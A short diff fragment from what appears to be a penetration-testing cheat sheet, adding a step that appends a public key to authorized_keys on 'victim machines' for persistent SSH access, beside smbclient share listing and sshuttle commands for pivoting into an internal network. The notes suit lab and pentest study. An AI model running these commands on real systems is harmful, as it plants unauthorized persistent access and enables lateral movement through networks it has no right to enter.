@@ -1522,6 +1522,12 @@ smbclient -L //172.16.50.10/ -U <USERNAME> --password=<PASSWORD>
 
 with id_rsa
 
+In victim machines
+
+```c
+cat id_rsa.pub >> authorized_keys
+```
+
 ```c
 sshuttle -v -r MI_IP RED_Q_KIERO/24 --ssh-cmd 'ssh -i id_rsa'
 sshuttle -vr user@IP_VICITMA RED_Q_KIERO/24 --ssh-cmd 'ssh -i id_rsa' //desde maquina atacante a maquina victima de donde la id_rsa
